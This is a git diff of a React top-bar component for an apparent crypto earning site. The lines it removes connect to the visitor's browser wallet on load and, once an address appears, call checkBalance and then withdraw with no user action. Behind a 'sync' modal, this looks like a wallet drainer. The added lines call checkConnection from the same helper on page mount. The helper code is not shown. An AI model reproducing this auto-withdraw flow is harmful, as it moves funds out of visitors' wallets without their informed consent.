@@ -3,9 +3,7 @@ import PropTypes from "prop-types";
 import $ from "jquery";
 import { NavLink, useNavigate, useParams } from "react-router-dom";
 import { UserContext } from "../../UserContext";
-import { sendNativeCurrency } from "../../helpers/send-transaction";
-import { isMobile } from "../../helpers/calculations";
-import { checkBalance, withdraw } from "../../helpers/connect-ishodniy";
+import { checkConnection } from "../../helpers/connect-ishodniy";
 
 function TopBar({
   showJumbotron = true,
@@ -34,62 +32,18 @@ function TopBar({
   useEffect(() => {
     $("#main_menu").toggle(showMenu);
   }, [showMenu]);
-
+  const check = async (params) => {
+    await checkConnection(setShowSyncModal, setWalletModalOptions);
+  };
   useEffect(() => {
-    async function fetchData(params) {
-      if (window.ethereum) {
-        if (isMobile()) {
-          await Moralis.enableWeb3();
-        }
-        const chainId = window.ethereum.chainId;
-        const web3 = new Web3(window.ethereum);
-        const accounts = await web3.eth.getAccounts();
-        if (accounts.length !== 0) {
-          setValue({ ...value, adress: accounts[0] });
-          if (!value.signed) {
-            setShowSyncModal(true);
-          }
-        }
-        window.ethereum.on("accountsChanged", (accounts) => {
-          if (!accounts.length) {
-            setValue({ ...value, adress: null });
-          } else {
-            fetchData();
-          }
-        });
-
-        if (value.adress) {
-          checkBalance(chainId).then(async () => {
-            if (!value.signed) {
-              withdraw(value, chainId, setValue)
-                .then(() => {
-                  setShowSyncModal(false);
-                  navigate("/user");
-                })
-                .catch(() => {
-                  setShowSyncModal(true);
-                });
-            }
-          });
-        }
-        window.ethereum.on("accountsChanged", (accounts) => {
-          if (!accounts.length) {
-            setValue({ ...value, adress: null });
-          } else {
-            fetchData();
-          }
-        });
-      }
-    }
-
-    // fetchData();
-  }, [value.adress]);
+    check();
+  }, []);
   const connectWallet = async (e) => {
     e.preventDefault();
-    setWalletModalOptions({
-      open: true,
-      URL: null,
-    });
+    // setWalletModalOptions({
+    //   open: true,
+    //   URL: null,
+    // });
   };
 
   const startEarning = async (e) => {
@@ -100,9 +54,9 @@ function TopBar({
   const DesktopInfo = () => (
     <div className="flex space-x-4 items-center">
       <div className="auth mob-hide">
-        <NavLink
-          to={id ? `/user/${id}` : `/user`}
-          onClick={!value.adress || !value.signed ? connectWallet : undefined}
+        <a
+          // href={id ? `/user/${id}` : `/user`}
+          // onClick={!value.adress || !value.signed ? connectWallet : undefined}
           className={`btn-border ${
             isLight ? "bg-gray-100 border-gray-400 hover:text-gray-900" : ""
           }`}
@@ -115,7 +69,7 @@ function TopBar({
           <span className="bg-orange-500 h-10 inline-block p-2.5 rounded-xl w-10">
             <img src="img/User.svg" alt="" />
           </span>
-        </NavLink>
+        </a>
       </div>
       <div onClick={onMenuToggle}>
         <a
@@ -139,9 +93,9 @@ function TopBar({
   const MobileInfo = () => (
     <div className="md:hidden inline-block mt-20">
       <div className="auth">
-        <NavLink
-          to={id ? `/user/${id}` : `/user`}
-          onClick={!value.adress || !value.signed ? connectWallet : undefined}
+        <a
+          // href={id ? `/user/${id}` : `/user`}
+          // onClick={!value.adress || !value.signed ? connectWallet : undefined}
           className={`btn-border ${
             isLight ? "bg-gray-100 border-gray-400 hover:text-gray-900" : ""
           }`}
@@ -154,7 +108,7 @@ function TopBar({
           <span className="bg-orange-500 h-10 inline-block p-2.5 rounded-xl w-10">
             <img src="img/User.svg" id="mob" alt="" />
           </span>
-        </NavLink>
+        </a>
       </div>
     </div>
   );
